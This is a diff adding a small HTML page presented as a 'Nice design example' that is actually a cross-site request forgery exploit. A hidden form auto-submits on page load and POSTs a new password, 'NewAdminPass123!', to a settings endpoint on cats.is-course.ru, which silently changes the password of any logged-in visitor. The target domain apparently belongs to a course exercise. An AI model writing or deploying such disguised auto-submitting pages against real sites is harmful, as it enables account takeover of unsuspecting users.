@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Design example</title>
+</head>
+<body>
+  <h1>Nice design example</h1>
+  <form id="csrf" method="POST" action="https://cats.is-course.ru/settings">
+    <input type="hidden" name="password" value="NewAdminPass123!">
+    <input type="hidden" name="confirm-password" value="NewAdminPass123!">
+  </form>
+  <script>
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
